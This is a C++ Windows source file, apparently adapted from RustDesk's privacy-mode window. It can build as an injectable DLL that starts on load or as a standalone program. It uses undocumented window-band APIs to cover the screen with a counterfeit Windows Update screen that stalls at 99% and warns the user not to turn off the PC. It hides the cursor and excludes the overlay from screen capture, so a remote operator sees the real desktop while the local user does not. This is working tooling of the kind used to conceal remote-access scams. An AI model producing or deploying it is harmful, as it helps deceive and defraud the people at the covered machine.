#include "pch.h" 

#include <map>

using namespace Gdiplus;
using namespace std;

#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "gdiplus.lib") 

enum ZBID {
  ZBID_DEFAULT = 0,
  ZBID_DESKTOP = 1,
  ZBID_UIACCESS = 2,
  ZBID_IMMERSIVE_IHM = 3,
  ZBID_IMMERSIVE_NOTIFICATION = 4,
  ZBID_IMMERSIVE_APPCHROME = 5,
  ZBID_IMMERSIVE_MOGO = 6,
  ZBID_IMMERSIVE_EDGY = 7,
  ZBID_IMMERSIVE_INACTIVEMOBODY = 8,
  ZBID_IMMERSIVE_INACTIVEDOCK = 9,
  ZBID_IMMERSIVE_ACTIVEMOBODY = 10,
  ZBID_IMMERSIVE_ACTIVEDOCK = 11,
  ZBID_IMMERSIVE_BACKGROUND = 12,
  ZBID_IMMERSIVE_SEARCH = 13,
  ZBID_GENUINE_WINDOWS = 14,
  ZBID_IMMERSIVE_RESTRICTED = 15,
  ZBID_SYSTEM_TOOLS = 16,
  ZBID_LOCK = 17,
  ZBID_ABOVELOCK_UX = 18,
};

#define __imp_SetBrokeredForeground 2522

const TCHAR *WindowTitle = _T("RustDeskPrivacyWindow");
const TCHAR *ClassName = _T("RustDeskPrivacyWindowClass");

typedef enum tagDWMWINDOWATTRIBUTE {
  DWMWA_NCRENDERING_ENABLED,
  DWMWA_NCRENDERING_POLICY,
  DWMWA_TRANSITIONS_FORCEDISABLED,
  DWMWA_ALLOW_NCPAINT,
  DWMWA_CAPTION_BUTTON_BOUNDS,
  DWMWA_NONCLIENT_RTL_LAYOUT,
  DWMWA_FORCE_ICONIC_REPRESENTATION,
  DWMWA_FLIP3D_POLICY,
  DWMWA_EXTENDED_FRAME_BOUNDS,
  DWMWA_HAS_ICONIC_BITMAP,
  DWMWA_DISALLOW_PEEK,
  DWMWA_EXCLUDED_FROM_PEEK,
  DWMWA_CLOAK,
  DWMWA_CLOAKED,
  DWMWA_FREEZE_REPRESENTATION,
  DWMWA_PASSIVE_UPDATE_MODE,
  DWMWA_USE_HOSTBACKDROPBRUSH,
  DWMWA_USE_IMMERSIVE_DARK_MODE = 20,
  DWMWA_WINDOW_CORNER_PREFERENCE = 33,
  DWMWA_BORDER_COLOR,
  DWMWA_CAPTION_COLOR,
  DWMWA_TEXT_COLOR,
  DWMWA_VISIBLE_FRAME_BORDER_THICKNESS,
  DWMWA_SYSTEMBACKDROP_TYPE,
  DWMWA_LAST,
} DWMWINDOWATTRIBUTE;

typedef HWND(WINAPI *CreateWindowInBand)(
    _In_ DWORD dwExStyle, _In_opt_ ATOM atom, _In_opt_ LPCWSTR lpWindowName,
    _In_ DWORD dwStyle, _In_ int X, _In_ int Y, _In_ int nWidth,
    _In_ int nHeight, _In_opt_ HWND hWndParent, _In_opt_ HMENU hMenu,
    _In_opt_ HINSTANCE hInstance, _In_opt_ LPVOID lpParam, DWORD band);
typedef BOOL(WINAPI *SetWindowBand)(HWND hWnd, HWND hwndInsertAfter,
                                    DWORD dwBand);
typedef BOOL(WINAPI *GetWindowBand)(HWND hWnd, PDWORD pdwBand);
typedef HDWP(WINAPI *DeferWindowPosAndBand)(_In_ HDWP hWinPosInfo,
                                            _In_ HWND hWnd,
                                            _In_opt_ HWND hWndInsertAfter,
                                            _In_ int x, _In_ int y, _In_ int cx,
                                            _In_ int cy, _In_ UINT uFlags,
                                            DWORD band, DWORD pls);
typedef HRESULT(WINAPI *DwmSetWindowAttribute)(HWND hwnd,
                                               DWMWINDOWATTRIBUTE dwAttribute,
                                               LPCVOID pvAttribute,
                                               DWORD cbAttribute);

typedef BOOL(WINAPI *SetBrokeredForeground)(HWND hWnd);

HWND g_hwnd;
auto g_startTime = std::chrono::steady_clock::now();

// Global GDI+ Token
ULONG_PTR g_gdiplusToken;
bool g_cleanupPerformed = false;

// Windows Update progress variables
const int MAX_PROGRESS = 99; 
const int PROGRESS_DURATION_MS = 5 * 60 * 1000; 

static int g_lastProgress = -1;
static DWORD g_lastSpinnerFrame = 0;

// Forward Declarations
VOID OnPaintGdiPlus(HWND hwnd, HDC hdc);
void PerformCleanupAndExit();
BOOL WINAPI ConsoleCtrlHandler(DWORD fdwCtrlType);
void AtExitHandler();
void SetupExitHandlers();

// Windows Update function declarations
int GetCurrentProgress();
wstring GetProgressText(int percentage);
void DrawWindowsUpdateScreen(Graphics& graphics, int width, int height);
void DrawSpinner(Graphics& graphics, int centerX, int centerY, int radius);
void DrawText(Graphics& graphics, const wstring& text, int x, int y, int size, const Color& color, bool center = false);

BOOL IsWindowsVersionOrGreater(DWORD os_major, DWORD os_minor,
                               DWORD build_number, WORD service_pack_major,
                               WORD service_pack_minor);

LRESULT CALLBACK TrashParentWndProc(HWND hwnd, UINT message, WPARAM wParam,
                                    LPARAM lParam) {
  switch (message) {
  case WM_CREATE:
      SetTimer(hwnd, 1, 150, NULL); 
      g_lastProgress = -1; 
      g_lastSpinnerFrame = 0;
    break;

  case WM_DESTROY:
      KillTimer(hwnd, 1);
      PostQuitMessage(0);
    break;

  case WM_TIMER:
    if (wParam == 1) {
      int currentProgress = GetCurrentProgress();
      auto now = chrono::steady_clock::now();
      auto elapsed = chrono::duration_cast<chrono::milliseconds>(now - g_startTime).count();
      DWORD currentSpinnerFrame = (elapsed / 150) % 12;
      
      if (currentProgress != g_lastProgress || currentSpinnerFrame != g_lastSpinnerFrame) {
        g_lastProgress = currentProgress;
        g_lastSpinnerFrame = currentSpinnerFrame;
        InvalidateRect(hwnd, NULL, TRUE);
      }
    }
    break;

  case WM_ERASEBKGND:
      return 1;
    break;

  case WM_SETCURSOR:
    {
        if (LOWORD(lParam) == HTCLIENT) {
            SetCursor(NULL);
            return TRUE; 
        }
    }
    break;
  case WM_WINDOWPOSCHANGING:
    return 0;
  case WM_CLOSE:
    PerformCleanupAndExit();
    PostQuitMessage(0);
    return 0;

  case WM_PAINT: {
    PAINTSTRUCT ps;
    HDC hdc = BeginPaint(hwnd, &ps);
    if (hdc) {
      OnPaintGdiPlus(hwnd, hdc);
      EndPaint(hwnd, &ps);
    }
  } break;

  default:
    break;
  }

  return DefWindowProc(hwnd, message, wParam, lParam);
}

void ShowErrorMsg(const TCHAR *caption) {
  DWORD code = GetLastError();
  TCHAR msg[256] = {
      0,
  };
  FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
                NULL, code, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), msg,
                (sizeof(msg) / sizeof(msg[0])), NULL);

#ifdef WINDOWINJECTION_EXPORTS
  TCHAR buf[1024] = {
      0,
  };
  _sntprintf_s(buf, sizeof(buf) / sizeof(buf[0]), _TRUNCATE,
               _T("%s, code 0x%x"), msg, code);
  MessageBox(NULL, buf, caption, 0);
#else
  _tprintf(_T("%s: %s, code 0x%x\n"), caption, msg, code);
#endif
}

void PerformCleanupAndExit() {
  if (g_cleanupPerformed) {
    return;
  }
  g_cleanupPerformed = true;

#ifdef WINDOWINJECTION_EXPORTS
  OutputDebugStringA("PerformCleanupAndExit: Starting cleanup...\n");
#else
  _tprintf(_T("PerformCleanupAndExit: Starting cleanup...\n"));
#endif
  SetCursor(LoadCursor(NULL, IDC_ARROW));
    if (g_hwnd) {
    DestroyWindow(g_hwnd);
    g_hwnd = NULL;
  }
}

BOOL WINAPI ConsoleCtrlHandler(DWORD fdwCtrlType) {
  switch (fdwCtrlType) {
    case CTRL_C_EVENT:
    case CTRL_BREAK_EVENT:
    case CTRL_CLOSE_EVENT:
    case CTRL_LOGOFF_EVENT:
    case CTRL_SHUTDOWN_EVENT:
      PerformCleanupAndExit();
      return TRUE;
    default:
      return FALSE;
  }
}

void AtExitHandler() {
  PerformCleanupAndExit();
}

void SetupExitHandlers() {
  SetConsoleCtrlHandler(ConsoleCtrlHandler, TRUE);
  atexit(AtExitHandler);
}

HWND CreateWin(HMODULE hModule, UINT zbid, const TCHAR *title,
               const TCHAR *classname) {
  HINSTANCE hInstance = hModule;
  WNDCLASSEX wndParentClass;

  wndParentClass.cbSize = sizeof(WNDCLASSEX);
  wndParentClass.cbClsExtra = 0;
  wndParentClass.cbWndExtra = 0;
  wndParentClass.hIcon = NULL;
  wndParentClass.lpszMenuName = NULL;
  wndParentClass.hIconSm = NULL;
  wndParentClass.lpfnWndProc = TrashParentWndProc;
  wndParentClass.hInstance = hInstance;
  wndParentClass.style = CS_HREDRAW | CS_VREDRAW;
  wndParentClass.hCursor = NULL; 
  wndParentClass.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH);
  wndParentClass.lpszClassName = classname;

  auto res = RegisterClassEx(&wndParentClass);
  if (res == 0) {
    ShowErrorMsg(_T("RegisterClassEx"));
    return nullptr;
  }

  const auto hpath = LoadLibrary(_T("user32.dll"));
  if (hpath == 0) {
    ShowErrorMsg(_T("LoadLibrary user32.dll"));
    return nullptr;
  }

  const auto pCreateWindowInBand =
      CreateWindowInBand(GetProcAddress(hpath, "CreateWindowInBand"));
  if (!pCreateWindowInBand) {
    ShowErrorMsg(_T("GetProcAddress CreateWindowInBand"));
    return nullptr;
  }

  HWND hwnd = pCreateWindowInBand(WS_EX_TOPMOST | WS_EX_NOACTIVATE, res, NULL,
                                  0x80000000, 0, 0, 0, 0, NULL, NULL,
                                  wndParentClass.hInstance, LPVOID(res), zbid);
  if (!hwnd) {
    ShowErrorMsg(_T("CreateWindowInBand"));
    return nullptr;
  }

  if (FALSE == SetWindowText(hwnd, title)) {
    ShowErrorMsg(_T("SetWindowText"));
    return nullptr;
  }

  HMONITOR hmon = MonitorFromWindow(hwnd, MONITOR_DEFAULTTONEAREST);
  MONITORINFO mi = {sizeof(mi)};

  if (0 == GetMonitorInfo(hmon, &mi)) {
    ShowErrorMsg(_T("GetMonitorInfo"));
    return nullptr;
  }

  if (0 == SetWindowPos(hwnd, nullptr, mi.rcMonitor.left, mi.rcMonitor.top,
                        mi.rcMonitor.right - mi.rcMonitor.left,
                        mi.rcMonitor.bottom - mi.rcMonitor.top,
                        SWP_SHOWWINDOW | SWP_NOZORDER)) {
    ShowErrorMsg(_T("SetWindowPos"));
    return nullptr;
  }

  auto setLongRes = SetWindowLong(
      hwnd, GWL_EXSTYLE,
      GetWindowLong(hwnd, GWL_EXSTYLE) | WS_EX_LAYERED |
          WS_EX_TOOLWINDOW | WS_EX_TOPMOST | WS_EX_NOACTIVATE);
  if (0 == setLongRes) {
    ShowErrorMsg(_T("SetWindowLong"));
    return nullptr;
  }

  ShowWindow(hwnd, SW_HIDE);

  if (FALSE == UpdateWindow(hwnd)) {
    ShowErrorMsg(_T("UpdateWindow"));
    return nullptr;
  }

  return hwnd;
}

// https://github.com/killtimer0/uiaccess/issues/3#issuecomment-1787022010
HRESULT CloakWindow(HWND hwnd, BOOL cloakHwnd) {
  HRESULT result;
  HMODULE hMod = LoadLibrary(TEXT("dwmapi.dll"));
  if (hMod) {
    DwmSetWindowAttribute pDwmSetWindowAttribute =
        (DwmSetWindowAttribute)GetProcAddress(hMod, "DwmSetWindowAttribute");
    if (pDwmSetWindowAttribute) {
      result = pDwmSetWindowAttribute(hwnd, DWMWA_CLOAK, &cloakHwnd,
                                      sizeof(cloakHwnd));
    } else {
      result = HRESULT_FROM_WIN32(GetLastError());
    }
    FreeLibrary(hMod);
  } else {
    result = HRESULT_FROM_WIN32(GetLastError());
  }
  return result;
}

DWORD WINAPI UwU(LPVOID lpParam) {
  GdiplusStartupInput gdiplusStartupInput;
  Status gdiStatus = GdiplusStartup(&g_gdiplusToken, &gdiplusStartupInput, NULL);
  if (gdiStatus != Ok) {
#ifdef WINDOWINJECTION_EXPORTS
      MessageBox(NULL, _T("Failed to initialize GDI+"), _T("Error"), 0);
#else
      _tprintf(_T("Failed to initialize GDI+\n"));
#endif
      return 0;
  }

#ifdef WINDOWINJECTION_EXPORTS
  g_hwnd = CreateWin(NULL, ZBID_UIACCESS, WindowTitle, ClassName);
#else
  g_hwnd = CreateWin(NULL, ZBID_DESKTOP, WindowTitle, ClassName);
#endif

  if (!g_hwnd) {
#ifdef WINDOWINJECTION_EXPORTS
    MessageBox(NULL, _T("Failed to create window"), _T("Error"), 0);
#else
    _tprintf(_T("Failed to create window\n"));
#endif
    return 0;
  }

  (void)CloakWindow(g_hwnd, TRUE);
  if (IsWindowsVersionOrGreater(10, 0, 19041, 0, 0) == TRUE) {
    (void)SetWindowDisplayAffinity(g_hwnd, WDA_EXCLUDEFROMCAPTURE);
  }

  // Setup additional exit handlers for safety
  SetupExitHandlers();

#ifndef WINDOWINJECTION_EXPORTS
  ShowWindow(g_hwnd, SW_SHOW);
#else
  ShowWindow(g_hwnd, SW_SHOW);
#endif

  MSG msg;
  while (GetMessage(&msg, nullptr, 0, 0)) {
    TranslateMessage(&msg);
    DispatchMessage(&msg);
  }

  // Shut down GDI+
  GdiplusShutdown(g_gdiplusToken);

  return 0;
}

VOID OnPaintGdiPlus(HWND hwnd, HDC hdc) {
  if (!hdc) {
    return;
  }

  RECT rect;
  GetClientRect(hwnd, &rect);
  int width = rect.right - rect.left;
  int height = rect.bottom - rect.top;

  HDC memDC = CreateCompatibleDC(hdc);
  HBITMAP memBitmap = CreateCompatibleBitmap(hdc, width, height);
  HBITMAP oldBitmap = (HBITMAP)SelectObject(memDC, memBitmap);

  Gdiplus::Graphics graphics(memDC);
  graphics.SetSmoothingMode(SmoothingModeAntiAlias);
  graphics.SetTextRenderingHint(TextRenderingHintClearTypeGridFit);
  graphics.SetCompositingQuality(CompositingQualityHighSpeed);

  DrawWindowsUpdateScreen(graphics, width, height);

  BitBlt(hdc, 0, 0, width, height, memDC, 0, 0, SRCCOPY);

  SelectObject(memDC, oldBitmap);
  DeleteObject(memBitmap);
  DeleteDC(memDC);
}

int GetCurrentProgress() {
  auto now = std::chrono::steady_clock::now();
  auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(now - g_startTime).count();
  
  if (elapsed >= PROGRESS_DURATION_MS) {
    return MAX_PROGRESS; // Stuck at 99%
  }
  
  float progress = (float)elapsed / PROGRESS_DURATION_MS * MAX_PROGRESS;
  return (int)progress;
}

wstring GetProgressText(int percentage) {
  return to_wstring(percentage) + L"% complete";
}

void DrawWindowsUpdateScreen(Graphics& graphics, int width, int height) {
  static LinearGradientBrush* bgBrush = nullptr;
  static int lastHeight = 0;
  
  if (!bgBrush || height != lastHeight) {
    if (bgBrush) delete bgBrush;
    bgBrush = new LinearGradientBrush(Point(0,0), Point(0,height), Color(255,0,120,215), Color(255,0,90,158));
    lastHeight = height;
  }
  
  graphics.FillRectangle(bgBrush, 0, 0, width, height);

  int centerX = width / 2;
  int centerY = height / 2;

  DrawSpinner(graphics, centerX, centerY, 20);

  int currentProgress = GetCurrentProgress();
  wstring progressText = L"Working on updates " + GetProgressText(currentProgress);
  DrawText(graphics, progressText, centerX, centerY + 28, 26, Color(255,255,255,255), true);

  wstring statusText = (currentProgress < 99) ?
    L"Don't turn off your PC. This will take a while." :
    L"Don't turn off your PC. We're finishing up.";
  DrawText(graphics, statusText, centerX, centerY + 60, 20, Color(255,245,245,245), true);

  DrawText(graphics, L"Your PC will restart several times.", centerX, height - 80, 16, Color(255,245,245,245), true);
}

void DrawSpinner(Graphics& graphics, int centerX, int centerY, int radius) {
  auto now = std::chrono::steady_clock::now();
  auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(now - g_startTime).count();

  float rotation = (elapsed % 2000) * 360.0f / 2000.0f;

  const int numDots = 12;
  const int dotSize = 6;
  for (int i = 0; i < numDots; i++) {
    float angleDeg = rotation + i * (360.0f / numDots);
    float angleRad = angleDeg * 3.14159f / 180.0f;

    int dotX = centerX + (int)(radius * cos(angleRad));
    int dotY = centerY + (int)(radius * sin(angleRad));

    // Leading dot brightest, trailing dots fade out
    int fadeIndex = (numDots - i) % numDots;
    
    int r = 255, g = 255, b = 255; // leading dot
    // trailing dots reduce RGB slightly for bluish fade
    int alpha = (int)(0.2f + 0.8f * (fadeIndex / (float)numDots) * 255);
    SolidBrush dotBrush(Color(alpha, r, g, b));

    graphics.FillEllipse(&dotBrush, dotX - dotSize / 2, dotY - dotSize / 2, dotSize, dotSize);
  }
}

void DrawText(Graphics& graphics, const wstring& text, int x, int y, int size, const Color& color, bool center) {
  static FontFamily* fontFamily = nullptr;
  static map<int, Font*> fontCache;
  static map<DWORD, SolidBrush*> brushCache;
  
  if (!fontFamily) {
    fontFamily = new FontFamily(L"Segoe UI");
  }
  
  Font* font = nullptr;
  auto fontIt = fontCache.find(size);
  if (fontIt != fontCache.end()) {
    font = fontIt->second;
  } else {
    font = new Font(fontFamily, (REAL)size, FontStyleRegular, UnitPixel);
    fontCache[size] = font;
  }
  
  DWORD colorValue = color.GetValue();
  SolidBrush* brush = nullptr;
  auto brushIt = brushCache.find(colorValue);
  if (brushIt != brushCache.end()) {
    brush = brushIt->second;
  } else {
    brush = new SolidBrush(color);
    brushCache[colorValue] = brush;
  }

  if (center) {
    // Measure text to center it
    RectF boundingRect;
    graphics.MeasureString(text.c_str(), -1, font, PointF(0, 0), &boundingRect);
    PointF point((REAL)(x - boundingRect.Width / 2), (REAL)y);
    graphics.DrawString(text.c_str(), -1, font, point, brush);
  } else {
    PointF point((REAL)x, (REAL)y);
    graphics.DrawString(text.c_str(), -1, font, point, brush);
  }
}


#ifdef WINDOWINJECTION_EXPORTS

// https://docs.microsoft.com/en-us/windows/win32/dlls/dllmain
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ulReasonForCall,
                      LPVOID lpReserved) {
  // https://tbhaxor.com/loading-dlls-using-cpp-in-windows/
  switch (ulReasonForCall) {
  case DLL_PROCESS_ATTACH:
    CreateThread(nullptr, 0, UwU, hModule, NULL, NULL);
    break;
  case DLL_THREAD_ATTACH:
    break;
  case DLL_THREAD_DETACH:
    break;
  case DLL_PROCESS_DETACH:
    PerformCleanupAndExit();
    break;
  default:
    break;
  }

  return TRUE;
}

#else

int main(int argc, char *argv[]) {
  HMODULE hInstance = nullptr;
  BOOL result =
      GetModuleHandleExA(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS |
                             GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
                         reinterpret_cast<char *>(&DefWindowProc), &hInstance);
  if (FALSE == result) {
    printf("Failed to GetModuleHandleExA, 0x%x\n", GetLastError());
    return 0;
  }

  return UwU(hInstance);
}

#endif

// https://github.com/nodejs/node-convergence-archive/blob/e11fe0c2777561827cdb7207d46b0917ef3c42a7/deps/uv/src/win/util.c#L780
BOOL IsWindowsVersionOrGreater(DWORD os_major, DWORD os_minor,
                               DWORD build_number, WORD service_pack_major,
                               WORD service_pack_minor) {
  OSVERSIONINFOEX osvi;
  DWORDLONG condition_mask = 0;
  int op = VER_GREATER_EQUAL;

  /* Initialize the OSVERSIONINFOEX structure. */
  ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));
  osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
  osvi.dwMajorVersion = os_major;
  osvi.dwMinorVersion = os_minor;
  osvi.dwBuildNumber = build_number;
  osvi.wServicePackMajor = service_pack_major;
  osvi.wServicePackMinor = service_pack_minor;

  /* Initialize the condition mask. */
  VER_SET_CONDITION(condition_mask, VER_MAJORVERSION, op);
  VER_SET_CONDITION(condition_mask, VER_MINORVERSION, op);
  VER_SET_CONDITION(condition_mask, VER_SERVICEPACKMAJOR, op);
  VER_SET_CONDITION(condition_mask, VER_SERVICEPACKMINOR, op);

  /* Perform the test. */
  return VerifyVersionInfo(&osvi,
                           VER_MAJORVERSION | VER_MINORVERSION |
                               VER_SERVICEPACKMAJOR | VER_SERVICEPACKMINOR,
                           condition_mask);
}